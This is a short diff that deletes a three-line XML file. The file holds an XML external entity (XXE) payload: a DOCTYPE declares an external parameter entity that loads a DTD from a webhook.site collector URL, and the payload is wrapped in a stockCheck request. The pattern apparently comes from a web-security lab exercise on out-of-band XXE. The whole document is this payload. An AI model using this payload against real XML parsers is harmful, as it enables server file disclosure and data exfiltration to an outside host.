@@ -1,3 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://webhook.site/bcfa47d8-0413-4b24-91dc-b9fa409ab238/our.dtd"> %xxe;]>
-<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
